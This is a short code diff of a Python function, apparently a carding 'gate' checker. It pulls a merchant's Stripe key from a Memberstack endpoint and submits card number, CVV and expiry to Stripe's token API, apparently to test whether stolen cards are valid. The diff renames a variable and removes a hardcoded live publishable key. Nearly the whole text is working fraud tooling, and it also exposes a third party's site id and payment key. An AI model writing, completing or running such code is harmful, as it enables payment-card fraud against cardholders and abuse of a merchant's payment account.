@@ -13,8 +13,8 @@ def gate(cc, mes, ano, cvv):
     payload = '{"site":"3d821376ab5cea803122c65b3572cff0"}'
     r1 = requests.post('https://api.memberstack.io/site/memberships', headers=headers_1, data=payload).json()
 
-    key = r1.get('stripeKey')
-    if not key:
+    stripe_key = r1.get('stripeKey')
+    if not stripe_key:
         return "⚠️ Error: no se pudo obtener stripeKey"
 
     headers_2 = {
@@ -26,7 +26,7 @@ def gate(cc, mes, ano, cvv):
     }
     payload_2 = (
         f"card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}"
-        f"&card[address_zip]=10080&key=pk_live_fLf50cDx65QXSdm6D9YbCwsx&_stripe_account={key}"
+        f"&card[address_zip]=10080&key={stripe_key}"
     )
     r_2 = requests.post('https://api.stripe.com/v1/tokens', headers=headers_2, data=payload_2)
     r2 = r_2.json()
